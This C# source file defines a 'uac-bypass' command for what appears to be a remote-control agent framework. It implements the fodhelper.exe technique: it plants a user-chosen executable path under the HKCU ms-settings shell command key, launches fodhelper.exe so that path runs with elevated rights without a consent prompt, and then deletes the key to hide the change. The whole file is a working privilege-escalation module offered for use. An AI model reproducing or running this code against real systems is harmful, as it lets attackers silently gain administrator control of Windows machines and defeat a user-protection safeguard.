using Agent.Commands;
using Agent.Models;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace UAC
{
    public class UacBypassCommand : AgentCommand
    {
        public override string Name => "uac-bypass";
        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (Environment.OSVersion.Version.Build < 9200)
            {
                result.Result = "This program requires NT 10.0 (Windows 10) or higher!";
                return;
            }

            if (task.SplittedArgs.Length != 1)
            {
                result.Result = $"Usage: {this.Name} file_to_tun";
                return;
            }

            string fileName = task.SplittedArgs[0].Trim();
            if (!File.Exists(fileName))
            {
                result.Result = "The file {arg} specified in the argument is not valid";
                return;
            }

            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!hasAdministrativeRight)
            {
                try
                {
                    RegistryKey rk;
                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\ms-settings\shell\open\command");
                    rk.SetValue("", fileName, RegistryValueKind.String);
                    rk.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    Process.Start(@"C:\Windows\System32\fodhelper.exe").WaitForExit();
                    rk.Close();
                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                    rk.DeleteSubKeyTree("ms-settings");
                    rk.Close();
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("An exception occured: " + ex.Message);
                    Console.ReadKey();
                    Environment.Exit(-1);
                }
            }

            result.Result = $"UAC Bypassed and ran {fileName}!";
        }
    }
}
